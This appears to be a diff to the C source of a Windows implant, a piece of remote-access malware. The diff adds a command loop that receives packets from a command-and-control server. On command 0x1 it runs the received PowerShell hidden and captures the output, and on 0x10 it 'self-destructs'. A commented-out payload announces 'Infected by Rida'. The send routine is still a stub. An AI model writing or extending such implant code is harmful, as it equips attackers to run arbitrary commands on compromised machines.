@@ -8,12 +8,12 @@
 #include <ws2tcpip.h>
 #include <windows.h>
 
-#pragma comment(lib, "ws2_32.lib")
-
 #include "Attacks/ExecutePowershell.h"
 #include "helper.h"
 
+#pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "wininet.lib")
+
 
 /*
 	gcc .\implant.c .\helper.c .\Attacks\ExecutePowershell.c -o .\implant.exe -lwininet -lws2_32
@@ -63,10 +63,39 @@ BOOL receiveC2Packet(PC2_PACKET receivedPacket){
     printf("[C2] Command ID : %lu\n", receivedPacket->CmdId);
 }
 
+BOOL SendC2Packet(PIMPLANT_PACKET sendingPacket) {
+    //TODO
+    return TRUE;
+
+}
+
 int main() {
     //ExecPowerShell(L"powershell.exe -NoProfile -WindowStyle Hidden -Command \"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Infected by Rida','Mouahahaha')\"");
 
     PC2_PACKET pkt = calloc(1, sizeof(C2_PACKET));
+    BOOL loop = 1;
+    while(loop) {
+        receiveC2Packet(pkt);
+        switch(pkt->CmdId) {
+            case 0x1:
+                printf("[C2] Received command ID 1 for {executePowershell}\n");
+                LPSTR output = ExecPowerShell(ConvertDataToLPCWSTR(pkt->Data));
+                printf("[C2] Command Output : \n%s\n=========================\n", output);
+                free(output);
+                break;
+            case 0x10 :
+                printf("[C2] Starting self-destruct !");
+                loop = 0;
+                break;
+            default :
+                printf("[-] Undefined command received, ignored...\n");
+                printf("[DEBUG] Hexdump :\n");
+                hexdump((BYTE*)pkt, sizeof(C2_PACKET));
+                printf("[END DEBUG]\n");
+                loop = 0;
+                break;
+    }
+    }
     receiveC2Packet(pkt);
 
     return 0;
